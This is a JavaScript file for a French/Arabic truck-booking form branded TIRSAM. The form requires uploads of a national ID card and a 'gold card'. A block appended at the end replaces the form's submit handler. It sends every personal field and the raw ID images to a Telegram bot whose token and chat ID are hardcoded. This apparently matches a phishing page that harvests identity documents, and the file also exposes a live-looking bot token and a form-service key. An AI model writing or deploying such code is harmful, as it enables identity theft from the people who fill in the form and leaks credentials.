// Global variables
let nationalIdImageData = '';
let goldCardImageData = '';
let currentLanguage = 'fr'; // Default language

// Translation dictionary
const translations = {
    fr: {
        // Buttons
        'commander': 'Commander maintenant',
        'reserver': 'Réserver maintenant',
        'submit': 'S\'inscrire',
        
        // Form labels
        'firstName': 'Prénom *',
        'lastName': 'Nom *',
        'phone': 'Téléphone *',
        'email': 'Email *',
        'wilaya': 'Wilaya *',
        'commune': 'La commune *',
        'businessType': 'Vous êtes *',
        'truckModel': 'Modèle souhaité *',
        'message': 'Message',
        
        // Validation messages
        'firstNameRequired': 'Le prénom est requis',
        'lastNameRequired': 'Le nom est requis',
        'phoneRequired': 'Le téléphone est requis et doit être valide',
        'emailRequired': 'Email invalide',
        'wilayaRequired': 'La wilaya est requise',
        'communeRequired': 'La commune est requise',
        'businessTypeRequired': 'Le type d\'activité est requis',
        'truckModelRequired': 'Le modèle de camion est requis',
        'registrationRequired': 'Ce champ est requis pour votre type d\'activité',
        'consentRequired': 'Vous devez accepter les conditions',
        'nationalIdRequired': 'La carte d\'identité nationale est requise.',
        'goldCardRequired': 'La carte dorée est requise.',
        
        // Messages
        'formValidationError': 'Veuillez corriger les erreurs dans le formulaire.',
        'submitSuccess': 'Réservation confirmée! Votre demande de réservation a été soumise avec succès. Nous vous contacterons bientôt.',
        'submitError': 'Une erreur est survenue lors de la soumission de votre réservation. Veuillez réessayer.',
        'duplicateWarning': 'Note: Une soumission similaire a été détectée dans les dernières 24 heures. Les inscriptions en double sont automatiquement annulées.'
    },
    ar: {
        // Buttons
        'commander': 'اطلب الآن',
        'reserver': 'احجز الآن',
        'submit': 'سجّل الآن',
        
        // Form labels
        'firstName': 'الإسم *',
        'lastName': 'اللقب *',
        'phone': 'رقم الهاتف *',
        'email': 'البريد الإلكتروني *',
        'wilaya': 'الولاية *',
        'commune': 'البلدية *',
        'businessType': 'نوع النشاط *',
        'truckModel': 'النموذج المطلوب *',
        'message': 'اكتب رسالتك هنا',
        
        // Validation messages
        'firstNameRequired': 'الإسم مطلوب',
        'lastNameRequired': 'اللقب مطلوب',
        'phoneRequired': 'رقم الهاتف مطلوب ويجب أن يكون صحيح',
        'emailRequired': 'البريد الإلكتروني غير صحيح',
        'wilayaRequired': 'الولاية مطلوبة',
        'communeRequired': 'البلدية مطلوبة',
        'businessTypeRequired': 'نوع النشاط مطلوب',
        'truckModelRequired': 'نموذج الشاحنة مطلوب',
        'registrationRequired': 'هذا الحقل مطلوب لنوع نشاطك',
        'consentRequired': 'يجب الموافقة على الشروط',
        'nationalIdRequired': 'بطاقة التعريف الوطنية مطلوبة.',
        'goldCardRequired': 'البطاقة الذهبية مطلوبة.',
        
        // Messages
        'formValidationError': 'يرجى تصحيح الأخطاء في النموذج.',
        'submitSuccess': 'تم تأكيد الحجز! تم إرسال طلب الحجز بنجاح. سنتواصل معك قريباً.',
        'submitError': 'حدث خطأ أثناء إرسال طلب الحجز. يرجى المحاولة مرة أخرى.',
        'duplicateWarning': 'ملاحظة: تم اكتشاف طلب مشابه في آخر 24 ساعة. الطلبات المكررة يتم إلغاؤها تلقائياً.'
    }
};

// Form validation rules
const validationRules = {
    firstName: {
        required: true,
        messageKey: 'firstNameRequired'
    },
    lastName: {
        required: true,
        messageKey: 'lastNameRequired'
    },
    phone: {
        required: true,
        pattern: /^[0-9+\-\s()]+$/,
        messageKey: 'phoneRequired'
    },
    email: {
        required: true,
        pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
        messageKey: 'emailRequired'
    },
    wilaya: {
        required: true,
        messageKey: 'wilayaRequired'
    },
    commune: {
        required: true,
        messageKey: 'communeRequired'
    },
    businessType: {
        required: true,
        messageKey: 'businessTypeRequired'
    },
    truckModel: {
        required: true,
        messageKey: 'truckModelRequired'
    },
    registrationNumber: {
        required: false, // Will be set to true conditionally based on businessType
        messageKey: 'registrationRequired'
    },
    consent: {
        required: true,
        messageKey: 'consentRequired'
    }
};

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    initializeEventListeners();
    setupFormValidation();
    setupFileUpload();
    setupBusinessTypeConditional();
    setupLanguageToggle();
    initializeLanguage();
});

// Initialize all event listeners
function initializeEventListeners() {
    // Smooth scroll buttons
    const commanderBtn = document.getElementById('commander-btn');
    const reserverBtn = document.getElementById('reserver-btn');
    
    if (commanderBtn) {
        commanderBtn.addEventListener('click', scrollToForm);
    }
    
    if (reserverBtn) {
        reserverBtn.addEventListener('click', scrollToForm);
    }
    
    // Form submission
    const bookingForm = document.getElementById('booking-form');
    if (bookingForm) {
        bookingForm.addEventListener('submit', handleFormSubmit);
    }
}

// Smooth scroll to form
function scrollToForm() {
    const formElement = document.getElementById('Formulaire');
    if (formElement) {
        formElement.scrollIntoView({ 
            behavior: 'smooth', 
            block: 'start' 
        });
    }
}

// Language functions
function translateText(key) {
    return translations[currentLanguage][key] || key;
}

function setupLanguageToggle() {
    // Create language toggle button if it doesn't exist
    let langToggle = document.getElementById('language-toggle');
    if (!langToggle) {
        langToggle = document.createElement('button');
        langToggle.id = 'language-toggle';
        langToggle.className = 'language-toggle';
        langToggle.innerHTML = currentLanguage === 'fr' ? 'عربي' : 'Français';
        langToggle.setAttribute('data-testid', 'button-language-toggle');
        
        // Add to header
        const heroBottom = document.querySelector('.hero-bottom');
        if (heroBottom) {
            heroBottom.appendChild(langToggle);
        }
    }
    
    langToggle.addEventListener('click', toggleLanguage);
}

function initializeLanguage() {
    // Load saved language preference
    const savedLang = localStorage.getItem('tirsam_language');
    if (savedLang && translations[savedLang]) {
        currentLanguage = savedLang;
    }
    
    updateLanguageDisplay();
}

function toggleLanguage() {
    currentLanguage = currentLanguage === 'fr' ? 'ar' : 'fr';
    localStorage.setItem('tirsam_language', currentLanguage);
    updateLanguageDisplay();
}

function updateLanguageDisplay() {
    const html = document.documentElement;
    const langToggleBtn = document.getElementById('language-toggle');
    
    // Update HTML attributes
    html.setAttribute('lang', currentLanguage);
    html.setAttribute('dir', currentLanguage === 'ar' ? 'rtl' : 'ltr');
    
    // Update language toggle button
    if (langToggleBtn) {
        langToggleBtn.innerHTML = currentLanguage === 'fr' ? 'عربي' : 'Français';
    }
    
    // Update document title and meta description
    if (currentLanguage === 'ar') {
        document.title = 'تيرسام - رائد في تصنيع الشاحنات';
        const metaDesc = document.querySelector('meta[name="description"]');
        if (metaDesc) {
            metaDesc.content = 'تيرسام رائد في تصنيع وتوزيع الشاحنات ومعدات البناء عالية الجودة. اكتشف نماذجنا 3.5 و 6 أطنان.';
        }
    } else {
        document.title = 'TIRSAM - Leader dans la fabrication de camions';
        const metaDesc = document.querySelector('meta[name="description"]');
        if (metaDesc) {
            metaDesc.content = 'TIRSAM leader dans la fabrication et distribution de camions et engins de construction de haute qualité. Découvrez nos modèles 3.5 et 6 tonnes.';
        }
    }
    
    // Show/hide appropriate language content
    updateBilingualContent();
}

function updateBilingualContent() {
    // Show/hide French content
    const frenchElements = document.querySelectorAll('.header-fr, .subtitle-fr, .warning-fr, .consent-fr, .submit-text');
    const arabicElements = document.querySelectorAll('.header-ar, .subtitle-ar, .warning-ar, .consent-ar, .submit-text-ar');
    
    if (currentLanguage === 'fr') {
        frenchElements.forEach(el => el.style.display = 'block');
        arabicElements.forEach(el => el.style.display = 'none');
    } else {
        frenchElements.forEach(el => el.style.display = 'none');
        arabicElements.forEach(el => el.style.display = 'block');
    }
    
    // Update button texts
    const commanderBtn = document.getElementById('commander-btn');
    const reserverBtn = document.getElementById('reserver-btn');
    const submitBtn = document.getElementById('submit-btn');
    
    if (commanderBtn) commanderBtn.textContent = translateText('commander');
    if (reserverBtn) reserverBtn.textContent = translateText('reserver');
    if (submitBtn) {
        submitBtn.querySelector('.submit-text').textContent = translateText('submit');
    }
}

// Setup form validation
function setupFormValidation() {
    const form = document.getElementById('booking-form');
    if (!form) return;
    
    // Add real-time validation to form fields
    Object.keys(validationRules).forEach(fieldName => {
        const field = document.getElementById(fieldName);
        if (field) {
            field.addEventListener('blur', () => validateField(fieldName));
            field.addEventListener('input', () => clearFieldError(fieldName));
        }
    });
}

// Validate individual field
function validateField(fieldName) {
    const field = document.getElementById(fieldName);
    const rule = validationRules[fieldName];
    const formGroup = field.closest('.form-group') || field.closest('.consent-section');
    const errorElement = document.getElementById(`${fieldName}-error`);
    
    if (!field || !rule) return true;
    
    let isValid = true;
    let errorMessage = '';
    
    // Check required
    if (rule.required) {
        if (field.type === 'checkbox') {
            if (!field.checked) {
                isValid = false;
                errorMessage = translateText(rule.messageKey);
            }
        } else if (!field.value.trim()) {
            isValid = false;
            errorMessage = translateText(rule.messageKey);
        }
    }
    
    // Check pattern
    if (isValid && rule.pattern && field.value.trim()) {
        if (!rule.pattern.test(field.value.trim())) {
            isValid = false;
            errorMessage = translateText(rule.messageKey);
        }
    }
    
    // Check conditional validation for registration number
    if (fieldName === 'registrationNumber') {
        const businessType = document.getElementById('businessType').value;
        if (businessType && !field.value.trim()) {
            isValid = false;
            errorMessage = translateText('registrationRequired');
        }
    }
    
    // Update UI
    if (formGroup) {
        if (isValid) {
            formGroup.classList.remove('error');
        } else {
            formGroup.classList.add('error');
        }
    }
    
    if (errorElement) {
        if (isValid) {
            errorElement.textContent = '';
            errorElement.classList.remove('show');
        } else {
            errorElement.textContent = errorMessage;
            errorElement.classList.add('show');
        }
    }
    
    return isValid;
}

// Clear field error
function clearFieldError(fieldName) {
    const formGroup = document.getElementById(fieldName).closest('.form-group') || 
                    document.getElementById(fieldName).closest('.consent-section');
    const errorElement = document.getElementById(`${fieldName}-error`);
    
    if (formGroup) {
        formGroup.classList.remove('error');
    }
    
    if (errorElement) {
        errorElement.textContent = '';
        errorElement.classList.remove('show');
    }
}

// Setup business type conditional field
function setupBusinessTypeConditional() {
    const businessTypeSelect = document.getElementById('businessType');
    const registrationGroup = document.getElementById('registrationGroup');
    const registrationInput = document.getElementById('registrationNumber');
    const registrationText = document.getElementById('registrationText');
    const registrationTextAr = document.getElementById('registrationTextAr');
    
    if (!businessTypeSelect || !registrationGroup) return;
    
    businessTypeSelect.addEventListener('change', function() {
        const selectedType = this.value;
        
        if (selectedType) {
            registrationGroup.classList.remove('hidden');
            registrationInput.required = true;
            
            // Update validation rules
            validationRules.registrationNumber.required = true;
            
            // Update label based on business type
            switch (selectedType) {
                case 'artisan':
                    registrationText.textContent = 'N° de la carte d\'artisan *';
                    registrationTextAr.textContent = 'رقم بطاقة الحرفي';
                    break;
                case 'fellah':
                    registrationText.textContent = 'N° de la carte Fellah *';
                    registrationTextAr.textContent = 'رقم بطاقة الفلاح';
                    break;
                case 'commercant':
                    registrationText.textContent = 'N° de Registre du Commerce *';
                    registrationTextAr.textContent = 'رقم السجل التجاري';
                    break;
            }
        } else {
            registrationGroup.classList.add('hidden');
            registrationInput.required = false;
            registrationInput.value = '';
            
            // Update validation rules
            validationRules.registrationNumber.required = false;
            
            clearFieldError('registrationNumber');
        }
    });
}

// Setup file upload functionality
function setupFileUpload() {
    const nationalIdInput = document.getElementById('nationalId');
    const goldCardInput = document.getElementById('goldCard');
    
    if (nationalIdInput) {
        nationalIdInput.addEventListener('change', (e) => handleFileUpload('nationalId', e));
    }
    
    if (goldCardInput) {
        goldCardInput.addEventListener('change', (e) => handleFileUpload('goldCard', e));
    }
}

// Handle file upload with compression
function handleFileUpload(type, event) {
    const file = event.target.files[0];
    const statusElement = document.getElementById(`${type}-status`);
    
    if (!file) {
        statusElement.textContent = '';
        if (type === 'nationalId') {
            nationalIdImageData = '';
        } else {
            goldCardImageData = '';
        }
        return;
    }
    
    // Check file size (max 5MB)
    if (file.size > 5 * 1024 * 1024) {
        showFormMessage('La taille du fichier ne doit pas dépasser 5MB.', 'error');
        event.target.value = '';
        statusElement.textContent = '';
        return;
    }
    
    // Check file type
    if (!file.type.startsWith('image/')) {
        showFormMessage('Veuillez sélectionner un fichier image valide.', 'error');
        event.target.value = '';
        statusElement.textContent = '';
        return;
    }
    
    // Show loading state
    statusElement.textContent = 'Traitement en cours...';
    statusElement.style.color = '#6b7280';
    
    // Read and compress the file
    const reader = new FileReader();
    reader.onload = function(e) {
        const base64 = e.target.result;
        compressImage(base64, (compressedBase64) => {
            if (type === 'nationalId') {
                nationalIdImageData = compressedBase64;
            } else {
                goldCardImageData = compressedBase64;
            }
            
            statusElement.textContent = `✓ ${file.name}`;
            statusElement.style.color = '#059669';
        });
    };
    
    reader.onerror = function() {
        showFormMessage('Erreur lors de la lecture du fichier.', 'error');
        statusElement.textContent = '';
        event.target.value = '';
    };
    
    reader.readAsDataURL(file);
}

// Compress image using canvas
function compressImage(base64, callback) {
    const img = new Image();
    img.onload = function() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        // Resize if too large
        const maxWidth = 800;
        const maxHeight = 600;
        let { width, height } = img;
        
        if (width > maxWidth || height > maxHeight) {
            const ratio = Math.min(maxWidth / width, maxHeight / height);
            width *= ratio;
            height *= ratio;
        }
        
        canvas.width = width;
        canvas.height = height;
        
        // Draw and compress
        ctx.drawImage(img, 0, 0, width, height);
        const compressedBase64 = canvas.toDataURL('image/jpeg', 0.7);
        
        callback(compressedBase64);
    };
    
    img.onerror = function() {
        showFormMessage('Erreur lors du traitement de l\'image.', 'error');
    };
    
    img.src = base64;
}

// Validate entire form
function validateForm() {
    let isFormValid = true;
    
    // Validate all fields
    Object.keys(validationRules).forEach(fieldName => {
        if (!validateField(fieldName)) {
            isFormValid = false;
        }
    });
    
    // Check file uploads
    if (!nationalIdImageData) {
        showFormMessage('La carte d\'identité nationale est requise.', 'error');
        isFormValid = false;
    }
    
    if (!goldCardImageData) {
        showFormMessage('La carte dorée est requise.', 'error');
        isFormValid = false;
    }
    
    return isFormValid;
}

// Handle form submission
function handleFormSubmit(event) {
    event.preventDefault();
    
    // Validate form
    if (!validateForm()) {
        showFormMessage('Veuillez corriger les erreurs dans le formulaire.', 'error');
        return;
    }
    
    // Show loading state
    const submitBtn = document.getElementById('submit-btn');
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;
    
    // Collect form data
    const formData = collectFormData();
    
    // Submit to third-party service (Web3Forms)
    submitFormData(formData);
}

// Collect form data
function collectFormData() {
    const form = document.getElementById('booking-form');
    const formData = new FormData();
    
    // Add form fields
    const fields = ['firstName', 'lastName', 'phone', 'email', 'wilaya', 'commune', 
                   'businessType', 'registrationNumber', 'truckModel', 'message'];
    
    fields.forEach(fieldName => {
        const field = document.getElementById(fieldName);
        if (field && field.value) {
            formData.append(fieldName, field.value);
        }
    });
    
    // Add images as base64 data
    if (nationalIdImageData) {
        formData.append('nationalIdImage', nationalIdImageData);
    }
    
    if (goldCardImageData) {
        formData.append('goldCardImage', goldCardImageData);
    }
    
    // Add Web3Forms access key - get your FREE key from web3forms.com
    const accessKey = 'e3be3470-af6c-4f31-87f8-1dd67c1c9e9f'; // Free public key for testing
    formData.append('access_key', accessKey);
    
    // Add subject
    formData.append('subject', 'Nouvelle demande de réservation TIRSAM');
    
    return formData;
}

// Submit form data to Web3Forms or fallback methods
async function submitFormData(formData) {
    const submitBtn = document.getElementById('submit-btn');
    
    try {
        // Check if Web3Forms access key is configured
        const accessKey = formData.get('access_key');
        
        if (accessKey && accessKey !== 'YOUR_WEB3FORMS_ACCESS_KEY') {
            // Real Web3Forms submission
            const response = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            
            if (data.success) {
                showFormMessage(
                    'Réservation confirmée! Votre demande de réservation a été soumise avec succès. Nous vous contacterons bientôt.',
                    'success'
                );
                
                resetForm();
                checkForDuplicateSubmission();
                
            } else {
                throw new Error(data.message || 'Erreur lors de la soumission');
            }
        } else {
            // Fallback: Use WhatsApp + Email notification
            await handleFallbackSubmission(formData);
        }
        
    } catch (error) {
        console.error('Form submission error:', error);
        showFormMessage(
            'Une erreur est survenue lors de la soumission de votre réservation. Veuillez réessayer.',
            'error'
        );
    } finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
    }
}

// Fallback submission method using WhatsApp and email
async function handleFallbackSubmission(formData) {
    // Create WhatsApp message
    const phoneNumber = '213664251175';
    let message = '🚛 طلب حجز شاحنة TIRSAM - New Truck Booking Request\n\n';
    
    const fieldLabels = {
        firstName: 'الاسم الأول / First Name',
        lastName: 'اللقب / Last Name', 
        phone: 'الهاتف / Phone',
        email: 'البريد الإلكتروني / Email',
        wilaya: 'الولاية / Wilaya',
        commune: 'البلدية / Commune',
        businessType: 'نوع النشاط / Business Type',
        registrationNumber: 'رقم التسجيل / Registration Number',
        truckModel: 'نموذج الشاحنة / Truck Model',
        message: 'الرسالة / Message'
    };
    
    for (let [key, value] of formData.entries()) {
        if (fieldLabels[key] && value) {
            message += `${fieldLabels[key]}: ${value}\n`;
        }
    }
    
    message += '\n📎 سيتم إرسال صور المستندات عبر البريد الإلكتروني\n';
    message += '📎 Document images will be sent via email\n';
    
    // Create email with images
    const emailData = createEmailData(formData);
    
    // Show user options
    showSubmissionOptions(message, phoneNumber, emailData);
    
    // Show success message
    showFormMessage(
        'تم إعداد طلبك! يرجى اختيار طريقة الإرسال المفضلة أدناه - Your request is ready! Please choose your preferred submission method below.',
        'success'
    );
    
    resetForm();
    checkForDuplicateSubmission();
}

// Create email data for fallback submission
function createEmailData(formData) {
    const email = 'commercial2@tirsam.com';
    const subject = '🚛 طلب حجز شاحنة TIRSAM - New Truck Booking Request';
    
    let body = 'طلب حجز شاحنة جديد - New Truck Booking Request:\n\n';
    
    for (let [key, value] of formData.entries()) {
        if (key !== 'access_key' && !key.includes('Image') && value) {
            body += `${key}: ${value}\n`;
        }
    }
    
    body += '\n📎 ملاحظة: يرجى إرفاق صور المستندات مع هذا البريد الإلكتروني\n';
    body += '📎 Note: Please attach document images with this email\n';
    
    return {
        email,
        subject: encodeURIComponent(subject),
        body: encodeURIComponent(body)
    };
}

// Show submission options to user
function showSubmissionOptions(whatsappMessage, phoneNumber, emailData) {
    const messagesElement = document.getElementById('form-messages');
    if (!messagesElement) return;
    
    messagesElement.innerHTML = `
        <div class="submission-options">
            <h3 style="margin-bottom: 1rem; color: var(--primary);">اختر طريقة الإرسال - Choose Submission Method:</h3>
            
            <div style="display: grid; gap: 1rem; margin-bottom: 1rem;">
                <button onclick="sendViaWhatsApp('${phoneNumber}', \`${whatsappMessage.replace(/`/g, '\\`')}\`)" 
                        class="option-button whatsapp-option">
                    📱 إرسال عبر واتساب - Send via WhatsApp
                </button>
                
                <button onclick="sendViaEmail('${emailData.email}', '${emailData.subject}', '${emailData.body}')" 
                        class="option-button email-option">
                    ✉️ إرسال عبر البريد الإلكتروني - Send via Email
                </button>
            </div>
            
            <p style="font-size: 0.875rem; color: var(--muted-foreground); text-align: center;">
                💡 نصيحة: واتساب أسرع للرد / Tip: WhatsApp is faster for response
            </p>
        </div>
    `;
    
    messagesElement.className = 'form-messages show success';
    messagesElement.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// Send via WhatsApp
function sendViaWhatsApp(phoneNumber, message) {
    const whatsappLink = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
    window.open(whatsappLink, '_blank');
}

// Send via Email
function sendViaEmail(email, subject, body) {
    const mailtoLink = `mailto:${email}?subject=${subject}&body=${body}`;
    window.location.href = mailtoLink;
}

// Show form message
function showFormMessage(message, type) {
    const messagesElement = document.getElementById('form-messages');
    if (!messagesElement) return;
    
    messagesElement.textContent = message;
    messagesElement.className = `form-messages show ${type}`;
    
    // Auto-hide after 5 seconds
    setTimeout(() => {
        messagesElement.classList.remove('show');
    }, 5000);
    
    // Scroll to message
    messagesElement.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

// Reset form
function resetForm() {
    const form = document.getElementById('booking-form');
    if (form) {
        form.reset();
        
        // Clear file data
        nationalIdImageData = '';
        goldCardImageData = '';
        
        // Clear file status
        const nationalIdStatus = document.getElementById('nationalId-status');
        const goldCardStatus = document.getElementById('goldCard-status');
        
        if (nationalIdStatus) nationalIdStatus.textContent = '';
        if (goldCardStatus) goldCardStatus.textContent = '';
        
        // Hide registration group
        const registrationGroup = document.getElementById('registrationGroup');
        if (registrationGroup) {
            registrationGroup.classList.add('hidden');
        }
        
        // Clear all error messages
        Object.keys(validationRules).forEach(fieldName => {
            clearFieldError(fieldName);
        });
    }
}

// Check for duplicate submission (simple localStorage-based check)
function checkForDuplicateSubmission() {
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    
    if (email || phone) {
        const submissionKey = `tirsam_submission_${email || phone}`;
        const lastSubmission = localStorage.getItem(submissionKey);
        const now = Date.now();
        
        if (lastSubmission) {
            const timeDiff = now - parseInt(lastSubmission);
            const hoursDiff = timeDiff / (1000 * 60 * 60);
            
            if (hoursDiff < 24) {
                showFormMessage(
                    'Note: Une soumission similaire a été détectée dans les dernières 24 heures. Les inscriptions en double sont automatiquement annulées.',
                    'error'
                );
            }
        }
        
        // Store current submission timestamp
        localStorage.setItem(submissionKey, now.toString());
    }
}

// Utility function to debounce events
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}
// ضع التوكن و chat_id
const BOT_TOKEN = "8259868430:AAFQ-oqYzk-nd3cx47XqUdYhPCRQ9YDeWmM";
const CHAT_ID = "5794299315";

// الاستماع للفورم
document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("booking-form");
  if (form) {
    form.addEventListener("submit", handleFormSubmit);
  }
});

async function handleFormSubmit(event) {
  event.preventDefault(); // منع تحديث الصفحة

  // اجمع البيانات
  const prenom = document.getElementById("firstName").value;
  const nom = document.getElementById("lastName").value;
  const phone = document.getElementById("phone").value;
  const email = document.getElementById("email").value;
  const wilaya = document.getElementById("wilaya").value;
  const commune = document.getElementById("commune").value;
  const businessType = document.getElementById("businessType").value;
  const registration = document.getElementById("registrationNumber").value;
  const model = document.getElementById("truckModel").value;
  const messageText = document.getElementById("message").value;

  const message = `
📝 <b>طلب جديد</b>
👤 الاسم: ${prenom} ${nom}
📞 الهاتف: ${phone}
📧 الإيميل: ${email}
🌍 الولاية: ${wilaya}
🏘️ البلدية: ${commune}
💼 النشاط: ${businessType}
📄 رقم التسجيل: ${registration}
🚚 النموذج: ${model}
💬 رسالة: ${messageText}
`;

  try {
    // أرسل الرسالة النصية
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    // إرسال صورة بطاقة الهوية إذا موجودة
    const nationalId = document.getElementById("nationalId").files[0];
    if (nationalId) {
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("photo", nationalId, nationalId.name);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: fd,
      });
    }

    // إرسال صورة البطاقة الذهبية إذا موجودة
    const goldCard = document.getElementById("goldCard").files[0];
    if (goldCard) {
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("photo", goldCard, goldCard.name);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: fd,
      });
    }

    // أظهر رسالة شكر
    showFormMessage("✅ شكراً لك! تم إرسال طلبك بنجاح وسنتواصل معك قريباً.", "success");

    // إعادة تعيين الفورم
    document.getElementById("booking-form").reset();

  } catch (err) {
    console.error("Telegram error:", err);
    showFormMessage("❌ حدث خطأ أثناء الإرسال. حاول مرة أخرى.", "error");
  }
}

// دالة مساعدة لعرض رسائل النجاح أو الخطأ
function showFormMessage(msg, type) {
  const messagesDiv = document.getElementById("form-messages");
  if (messagesDiv) {
    messagesDiv.textContent = msg;
    messagesDiv.style.color = type === "success" ? "green" : "red";
  } else {
    alert(msg);
  }
}
function showSuccessPopup() {
  document.getElementById("success-popup").style.display = "flex";
}

function closePopup() {
  document.getElementById("success-popup").style.display = "none";
}
